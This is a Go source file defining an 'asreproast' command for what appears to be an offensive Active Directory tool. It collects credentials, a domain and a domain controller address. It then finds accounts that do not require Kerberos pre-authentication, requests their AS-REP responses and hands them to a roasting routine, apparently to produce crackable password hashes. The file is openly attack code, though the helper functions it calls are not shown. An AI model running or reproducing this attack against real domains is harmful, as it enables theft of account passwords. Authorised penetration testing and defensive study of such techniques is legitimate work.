/*
Copyright © 2021 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"github.com/doubledeed-sec/gokrb5/v8/client"
	"github.com/spf13/cobra"
)

// asreproastCmd represents the asreproast command
var asreproastCmd = &cobra.Command{
	Use:   "asreproast",
	Short: "Asreproasts",
	Long: "",

	Run: func(cmd *cobra.Command, args []string) {
		tgt, _ := cmd.Flags().GetString("tgt")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		domain, _ := cmd.Flags().GetString("domain")
		dcip, _ := cmd.Flags().GetString("dc-ip")
		enc, _ := cmd.Flags().GetString("enc")

		asreproast(cmd, tgt, username, password, domain, dcip, enc)
	},
}

func init() {
	rootCmd.AddCommand(asreproastCmd)

	asreproastCmd.Flags().StringP(
		"tgt", "t", "", "Base64 encoded TGT to be used to obtain TGS",
	)
	asreproastCmd.Flags().StringP(
		"username", "u", "", "Username to be used for kerberos authentication",
	)
	asreproastCmd.Flags().StringP(
		"password", "p", "", "Password to be used for kerberos authentication",
	)
	asreproastCmd.Flags().StringP(
		"domain", "d", "", "Domain to be used for kerberos authentication",
	)
	asreproastCmd.Flags().StringP(
		"dc-ip", "", "", "IP Address of domain controller",
	)
	asreproastCmd.Flags().StringP(
		"enc", "", "rc4,aes128,aes256,desCRC,desMD5", "Encryption types, comma delimited",
	)
}

func asreproast(asreproastCmd *cobra.Command, tgtstring string, username string, password string, domain string, dcip string, enc string) {
	var cl *client.Client

	asreproastables := getPreAuthNotReq(username, password, domain, dcip)

	for _, a := range asreproastables {
		cl = NewCl(a, "test", domain, dcip, enc)
		tgt := GetASRep(cl)
		RoastTGT(tgt)
	}
}
